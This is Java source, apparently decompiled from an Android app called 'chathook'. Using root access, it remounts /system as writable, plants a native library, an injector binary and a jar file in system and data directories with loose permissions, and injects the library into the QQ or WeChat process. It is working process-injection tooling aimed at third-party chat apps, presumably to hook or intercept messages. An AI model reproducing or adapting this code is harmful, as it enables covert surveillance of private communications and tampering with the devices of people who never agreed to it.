package com.example.chathook;

import android.content.Context;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.util.Log;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;

public class InjectUtils {
    private static final String INJECT_CMD = "injectso_ad";
    private static final String LIB_PATH = "/system/lib/libcall.so";

    public static boolean doInject(Context context, String servername) {
        String processname;
        if (servername.equals(InjectApplicaiton.QQ_SOCKET_SERVER)) {
            processname = "com.tencent.mobileqq";
        } else {
            processname = "com.tencent.mm";
        }
        boolean exeCMD = exeCMD("inject_appso " + processname + " /system/lib/libcall.so " + servername + " \n");
        Log.i("yincc", " after exeCMD injectso");
        return exeCMD;
    }

    public static String getMountDate(Context context) {
        String system = "";
        FileInputStream fis = null;
        try {
            fis = context.openFileInput("mount");
            BufferedReader bufReader = new BufferedReader(new InputStreamReader(fis));
            String readLine = bufReader.readLine();
            do {
                readLine = bufReader.readLine();
                if (readLine == null) {
                    break;
                }
            } while (!readLine.contains(" /system "));
            system = readLine.substring(0, readLine.indexOf(" "));
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
        } catch (Throwable th) {
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e32) {
                    e32.printStackTrace();
                }
            }
        }
        return system;
    }

    public static String getUserId(Context context, String process_name) {
        String UserId = "";
        FileInputStream fis = null;
        try {
            fis = context.openFileInput("ps");
            BufferedReader bufReader = new BufferedReader(new InputStreamReader(fis));
            String readLine = bufReader.readLine();
            do {
                readLine = bufReader.readLine();
                if (readLine == null) {
                    break;
                }
            } while (!readLine.contains(process_name));
            UserId = readLine.substring(0, readLine.indexOf(" "));
            Log.i("yincc", "Userid=" + UserId);
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
        } catch (Throwable th) {
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e32) {
                    e32.printStackTrace();
                }
            }
        }
        return UserId;
    }

    public static boolean exeCMD(String cmd) {
        DataOutputStream mOutputStream = InjectApplicaiton.mOutputStream;
        if (mOutputStream == null) {
            try {
                InjectApplicaiton.mOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                mOutputStream = InjectApplicaiton.mOutputStream;
            } catch (IOException e) {
                Log.e("yincc", " exeCMD Exception == " + e.getMessage());
                e.printStackTrace();
            }
        }
        Log.i("yincc", "exec cmd " + cmd);
        mOutputStream.writeBytes(cmd);
        mOutputStream.flush();
        return false;
    }

    public static boolean ConnectToServer(String serverName) {
        boolean isConnect = false;
        try {
            LocalSocketAddress address = new LocalSocketAddress(serverName);
            LocalSocket client = new LocalSocket();
            client.connect(address);
            isConnect = client.isConnected();
            client.close();
            return isConnect;
        } catch (IOException e) {
            e.printStackTrace();
            return isConnect;
        }
    }

    public static void copyInjectfile(Context context) {
        String systemDev = getMountDate(context);
        Log.i("yincc", " systemDev == " + systemDev);
        exeCMD(new StringBuilder(String.valueOf("" + "mount -o remount,rw " + systemDev + " /system \n")).append("mount -o remount,rw /system \n").toString());
        exeCMD("mkdir /data/data/qy \n");
        exeCMD("chmod 777 /data/data/qy \n");
        File sofile = new File(LIB_PATH);
        File originalsoFile = new File(new StringBuilder(String.valueOf(context.getFilesDir().getAbsolutePath())).append("/libcall.so").toString());
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
        }
        Log.i("ligan", "file length =" + sofile.length() + "sufile = " + originalsoFile.length());
        exeCMD("rm /system/lib/libcall.so");
        while (true) {
            if (sofile.length() >= 1 && sofile.length() == originalsoFile.length()) {
                break;
            }
            StringBuilder sobuilder = new StringBuilder();
            sobuilder.append("cat ").append(context.getFilesDir().getAbsolutePath()).append("/libcall.so").append(" > ").append("/system/lib/libcall.so \n");
            exeCMD(sobuilder.toString());
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e2) {
            }
            Log.i("ligan", "cat libcall file ");
            Log.i("ligan", "file length =" + sofile.length() + "sufile = " + originalsoFile.length());
        }
        Log.i("ligan", " after cp libcall.so");
        File injectfile = new File("/system/bin/inject_appso");
        File originalinjectFile = new File(new StringBuilder(String.valueOf(context.getFilesDir().getAbsolutePath())).append("/inject_appso").toString());
        Log.i("ligan", "appsofile length =" + injectfile.length() + " original injectfile = " + originalinjectFile.length());
        while (true) {
            if (injectfile.length() >= 1 && injectfile.length() == originalinjectFile.length()) {
                break;
            }
            StringBuilder injectbuilder = new StringBuilder();
            injectbuilder.append("cat ").append(context.getFilesDir().getAbsolutePath()).append("/inject_appso").append(" > ").append("/system/bin/inject_appso \n");
            exeCMD(injectbuilder.toString());
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e3) {
            }
            Log.i("ligan", "cat inject_appso file ");
            Log.i("ligan", "inject_appso file length =" + injectfile.length() + " original injectfile = " + originalinjectFile.length());
        }
        Log.i("ligan", " after cp inject_appso");
        exeCMD("chmod 555 /system/bin/inject_appso \n");
        Log.i("ligan", " after chmod inject_appso");
        exeCMD("rm /data/data/qy/conn.jar");
        File jarfile = new File("/data/data/qy/conn.jar");
        File originalinjarFile = new File(new StringBuilder(String.valueOf(context.getFilesDir().getAbsolutePath())).append("/conn.jar").toString());
        Log.i("ligan", "jarfile length =" + jarfile.length() + " original jarfile = " + originalinjarFile.length());
        while (true) {
            if (jarfile.length() < 1 || jarfile.length() != originalinjarFile.length()) {
                StringBuilder jarbuilder = new StringBuilder();
                jarbuilder.append("cat ").append(context.getFilesDir().getAbsolutePath()).append("/conn.jar").append(" > ").append("/data/data/qy/conn.jar \n");
                exeCMD(jarbuilder.toString());
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e4) {
                }
                Log.i("ligan", "cat conn.jar file ");
                Log.i("ligan", "jarfile length =" + jarfile.length() + " original jarfile = " + originalinjarFile.length());
            } else {
                Log.i("ligan", " after cp conn.jar");
                exeCMD("chmod 777 /data/data/qy/conn.jar \n");
                Log.i("ligan", " after chmod conn.jar");
                return;
            }
        }
    }
}
